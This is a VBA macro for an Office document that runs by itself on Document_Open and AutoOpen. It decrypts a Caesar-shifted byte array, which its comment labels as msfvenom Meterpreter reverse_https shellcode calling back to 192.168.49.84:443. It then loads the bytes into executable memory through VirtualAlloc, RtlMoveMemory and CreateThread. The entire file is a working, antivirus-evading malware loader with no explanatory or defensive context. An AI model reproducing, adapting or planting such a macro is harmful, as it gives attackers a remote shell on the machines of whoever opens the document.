' Declare arguments for CreateThread, VirtualAlloc, and RtlMoveMemory
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Function mymacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    
    ' msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.49.84 LPORT=443 EXITFUNC=thread -f vbapplication, encrypted using caesar_encryptor_vba.cs
    buf = Array(254, 234, 145, 2, 2, 2, 98, 51, 212, 139, 231, 102, 141, 84, 50, 141, 84, 14, 141, 84, 22, 141, 116, 42, 17, 185, 76, 40, 51, 1, 51, 194, 174, 62, 99, 126, 4, 46, 34, 195, 209, 15, 3, 201, 75, 119, 241, 84, 89, 141, _
84, 18, 141, 68, 62, 3, 210, 141, 66, 122, 135, 194, 118, 78, 3, 210, 82, 141, 74, 26, 141, 90, 34, 3, 213, 135, 203, 118, 62, 51, 1, 75, 141, 54, 141, 3, 216, 51, 194, 195, 209, 15, 174, 3, 201, 58, 226, 119, 246, 5, _
127, 250, 61, 127, 38, 119, 226, 90, 141, 90, 38, 3, 213, 104, 141, 14, 77, 141, 90, 30, 3, 213, 141, 6, 141, 3, 210, 139, 70, 38, 38, 93, 93, 99, 91, 92, 83, 1, 226, 90, 97, 92, 141, 20, 235, 130, 1, 1, 1, 95, _
106, 112, 103, 118, 2, 106, 121, 107, 112, 107, 86, 106, 78, 121, 40, 9, 1, 215, 51, 221, 85, 85, 85, 85, 85, 234, 64, 2, 2, 2, 79, 113, 124, 107, 110, 110, 99, 49, 55, 48, 50, 34, 42, 89, 107, 112, 102, 113, 121, 117, _
34, 80, 86, 34, 56, 48, 51, 61, 34, 86, 116, 107, 102, 103, 112, 118, 49, 57, 48, 50, 61, 34, 116, 120, 60, 51, 51, 48, 50, 43, 34, 110, 107, 109, 103, 34, 73, 103, 101, 109, 113, 2, 106, 60, 88, 123, 169, 1, 215, 85, _
85, 108, 5, 85, 85, 106, 189, 3, 2, 2, 234, 117, 3, 2, 2, 49, 86, 120, 91, 101, 89, 58, 80, 103, 87, 58, 76, 108, 114, 89, 77, 109, 67, 97, 113, 99, 87, 121, 92, 118, 84, 56, 67, 59, 119, 77, 112, 119, 68, 85, _
81, 52, 107, 56, 78, 122, 67, 105, 109, 68, 58, 88, 117, 58, 105, 73, 84, 67, 70, 58, 88, 103, 109, 102, 69, 69, 122, 100, 78, 87, 84, 110, 69, 56, 68, 122, 101, 105, 116, 123, 119, 105, 114, 99, 103, 84, 114, 57, 110, 81, _
85, 84, 71, 107, 70, 119, 112, 83, 102, 68, 75, 115, 84, 76, 84, 107, 68, 86, 111, 89, 56, 58, 118, 123, 71, 58, 77, 85, 51, 112, 121, 103, 124, 82, 119, 84, 50, 104, 53, 52, 101, 56, 71, 68, 82, 105, 117, 114, 111, 79, _
68, 70, 115, 100, 99, 101, 109, 80, 124, 59, 86, 75, 109, 116, 52, 56, 124, 67, 87, 57, 75, 118, 112, 72, 73, 121, 108, 74, 111, 70, 107, 106, 53, 83, 92, 82, 99, 50, 76, 81, 85, 52, 71, 123, 80, 58, 105, 102, 103, 102, _
71, 104, 56, 56, 84, 113, 80, 86, 85, 117, 100, 118, 50, 47, 90, 110, 119, 115, 113, 117, 107, 102, 55, 105, 102, 69, 71, 69, 92, 92, 51, 121, 57, 120, 114, 72, 106, 104, 103, 118, 107, 113, 2, 82, 106, 89, 139, 161, 200, 1, _
215, 139, 200, 85, 106, 2, 52, 234, 134, 85, 85, 85, 89, 85, 88, 106, 237, 87, 48, 61, 1, 215, 152, 108, 12, 97, 106, 130, 53, 2, 2, 139, 226, 108, 6, 82, 108, 33, 88, 106, 119, 72, 160, 136, 1, 215, 85, 85, 85, 85, _
88, 106, 47, 8, 26, 125, 1, 215, 135, 194, 119, 22, 106, 138, 21, 2, 2, 106, 70, 242, 55, 226, 1, 215, 81, 119, 207, 234, 76, 2, 2, 2, 108, 66, 106, 2, 18, 2, 2, 106, 2, 2, 66, 2, 85, 106, 90, 166, 85, 231, _
1, 215, 149, 85, 85, 139, 233, 89, 106, 2, 34, 2, 2, 85, 88, 106, 20, 152, 139, 228, 1, 215, 135, 194, 118, 209, 141, 9, 3, 197, 135, 194, 119, 231, 90, 197, 97, 234, 109, 1, 1, 1, 51, 59, 52, 48, 51, 56, 58, 48, _
54, 59, 48, 58, 54, 2, 189, 226, 31, 44, 12, 106, 168, 151, 191, 159, 1, 215, 62, 8, 126, 12, 130, 253, 226, 119, 7, 189, 73, 21, 116, 113, 108, 2, 85, 1, 215)
    
    ' Decrypt buf
    For i = 0 To UBound(buf)
        buf(i) = buf(i) - 2
    Next i
    
    ' Leave memory location to API, set allocation to buf size, MEM_COMMIT and MEM_RESERVE, RWX
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    ' Loop through buf Array and copy each byte into allocated memory
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    ' Specify start address for code execution in new thread
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function

Sub Document_Open()
    mymacro
End Sub

Sub AutoOpen()
    mymacro
End Sub
